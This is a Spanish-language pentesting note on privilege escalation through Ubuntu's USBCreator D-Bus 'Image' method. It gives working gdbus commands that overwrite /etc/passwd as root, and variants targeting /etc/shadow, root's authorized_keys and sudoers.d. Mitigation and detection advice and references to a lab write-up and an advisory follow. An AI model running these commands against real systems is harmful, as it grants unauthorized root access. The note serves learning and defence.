---
topic: USBCreator — escritura arbitraria por D-Bus
tags: [linux, dbus, usbcreator, polkit, arbitrary-write, privesc]
---

# USBCreator — escritura arbitraria por D-Bus

[🌐 English](usbcreator-dbus-arbitrary-write.en.md) | **Español**

## Concepto

El servicio `com.ubuntu.USBCreator` expone el método `Image`, que copia una imagen a un destino. En versiones afectadas no valida el destino y permite a un usuario del grupo sudo copiar archivos arbitrarios como root sin contraseña.

## Cuándo aplica

- El usuario está en el grupo sudo o en un grupo autorizado por Polkit.
- USBCreator está instalado y el servicio D-Bus activo.
- Se puede llamar a `gdbus` o `dbus-send`.

## Procedimiento

1. Confirmar la interfaz con `gdbus introspect`.
2. Preparar un `/etc/passwd` o `/etc/shadow` modificado.
3. Copiarlo con `Image` al destino real.
4. Entrar con `su` usando la cuenta creada.

## Comandos

```bash
gdbus introspect --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator
gdbus call --system --dest com.ubuntu.USBCreator \
  --object-path /com/ubuntu/USBCreator \
  --method com.ubuntu.USBCreator.Image /dev/shm/passwd /etc/passwd true
su <USER>
```

## Variantes

- Copiar `/etc/shadow` con un hash conocido.
- Sobrescribir `authorized_keys` de root.
- Escribir un archivo en `/etc/sudoers.d`.

## Limitaciones

- El servicio puede estar parcheado.
- Polkit puede exigir autenticación.
- El usuario debe pertenecer al grupo permitido.

## Mitigación

- Actualizar USBCreator y validar destinos.
- Restringir la interfaz D-Bus y Polkit.
- No dar sudo a usuarios que no lo necesiten.

## Detección

- Llamadas a `USBCreator.Image` fuera de la instalación.
- Cambios en `/etc/passwd` o `/etc/shadow`.
- Nuevas cuentas con UID 0.

## Referencias

- [0xdf — Passage](https://0xdf.gitlab.io/2021/03/06/htb-passage.html)
- [Unit 42 — USBCreator](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [D-Bus — specification](https://www.freedesktop.org/wiki/Software/dbus/)
